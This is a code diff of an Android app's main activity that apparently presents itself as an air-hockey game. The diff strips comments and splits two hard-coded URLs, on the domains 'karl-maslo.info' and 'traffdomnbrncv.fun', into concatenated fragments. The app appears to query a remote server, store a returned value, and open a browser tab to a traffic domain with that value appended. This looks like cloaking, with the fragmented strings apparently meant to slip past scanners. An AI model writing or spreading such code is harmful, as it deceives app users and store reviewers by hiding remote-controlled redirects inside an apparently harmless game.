@@ -32,7 +32,8 @@ import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Map;
-
+import static com.aerohockeybyber.Constants.DEPLINK;
+import static com.aerohockeybyber.Constants.MY_SUB_URL;
 public final class MainActivity extends AppCompatActivity {
 
     static boolean bckPress;
@@ -76,36 +77,16 @@ public final class MainActivity extends AppCompatActivity {
         bckPress = false;
 
 
-
-
-
-
-
-
-
         if (InternetCon.checkConnection(getApplicationContext())) {
-            // Its Available...
 
             SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
-
             id = settings.getInt("ID", 0);
-       /* if(id == 0){
-
-        } */
-
-
-
 
             if(id == 1){
                 Log.i("It's:", "work");
                 openLink();
 
-
-
-
-
             }else if(id == 2){
-                //openUI();
                 Log.i("It's:", "id 2 open ui");
             }
             else
@@ -122,7 +103,12 @@ public final class MainActivity extends AppCompatActivity {
                 });
 
 
-                String url = "https://juicyyangfruits.fun/QkV7q5yx";
+
+                String url = "fuf.karl-maslo";
+               url = url + ".info/Wv4PNWVf";
+
+                    url = "https://" + url;
+
                 StringRequest request = new StringRequest(url, new Response.Listener<String>() {
                     @Override
                     public void onResponse(String response) {
@@ -210,7 +196,6 @@ public final class MainActivity extends AppCompatActivity {
                                         SharedPreferences.Editor editor = settings5.edit();
 
                                         editor.putString(MY_SUB_URL, string);
-                                        //editor.putString(MY_SUB_URL, "KEK");
                                         editor.commit();
 
 
@@ -274,8 +259,7 @@ public final class MainActivity extends AppCompatActivity {
 
             editor.putInt("ID", 2);
             editor.commit();
-            // Not Available...
-            //openUI();
+
 
         }
     }
@@ -310,8 +294,12 @@ public final class MainActivity extends AppCompatActivity {
 
         SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
         String myStrValue = settings.getString(MY_SUB_URL, "");
+        
+        String url = "traffdomnbrncv";
+        url = url + ".fun/85hYwwPG";
 
-        String url = "https://traffdomnbrncv.fun/pSMJ63p4" + myStrValue;
+        url = "https://" + url;
+        url = url + myStrValue;
         Log.i("MyLog: ", myStrValue);
         final Bitmap backButton = BitmapFactory.decodeResource(getResources(), R.drawable.round_done_black_24dp);
         CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
